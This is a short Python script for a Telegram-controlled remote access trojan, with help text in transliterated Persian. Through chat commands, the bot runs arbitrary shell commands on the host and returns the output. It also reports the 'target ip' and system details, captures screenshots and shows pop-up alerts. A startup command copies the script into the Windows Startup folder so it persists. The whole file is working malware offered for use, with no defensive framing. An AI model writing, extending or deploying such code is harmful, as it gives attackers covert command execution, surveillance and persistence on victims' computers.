import telebot,requests,os,platform,autopy,getpass,subprocess

bot = telebot.TeleBot("Token")

@bot.message_handler(commands=['start'])
def send_welcome(message):
	bot.reply_to(message, "ok!")
	#print(message)
@bot.message_handler(commands=['ip'])
def send_ip(message):
        s = requests.get("https://ipinfo.io")
        s = s.json()
        ip = s['ip']
        bot.reply_to(message,"target ip:"+ip)
@bot.message_handler(commands=['cmd'])
def send_cmd(message):
        #print(message.text)
        cmd = message.text.replace("/cmd ","")
        #print("cmd is : ",cmd)
        c = os.popen(cmd).read()
        bot.reply_to(message,c)
@bot.message_handler(commands=['sys'])
def send_sys(message):
        pl1 = platform.platform()
        pl2 = platform.node()
        pl3 = platform.system()
        bot.reply_to(message,"platform : "+pl1+"\n node : "+pl2+'\n system : '+pl3)
@bot.message_handler(commands=['msg'])
def send_msg(message):
        s = message.text.replace("/msg ","")
        autopy.alert.alert(s)
@bot.message_handler(commands=['screen'])
def send_screen(message):
        img = autopy.bitmap.capture_screen()
        img = img.save('a.png')
        photo = open('a.png','rb')
        bot.send_photo(message.chat.id,photo)
        
@bot.message_handler(commands=['help'])
def send_help(message):
        a = '''
/help ==> rahnama\n
/start ==> start kardan bot\n
/ip ==> get ip\n
/cmd ==> command prompt\n
/sys ==> get sysinfo\n
/msg ==> alert message\n
/screen capture screen\n
'''
        bot.reply_to(message,a)
@bot.message_handler(commands=['startup'])
def send_startup(message):
        user = getpass.getuser()
        s = 'copy first_bot.py "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"'.format(user)
        #print(s)
        a = subprocess.check_output(s,shell=True)
        bot.reply_to(message,a)
bot.polling()
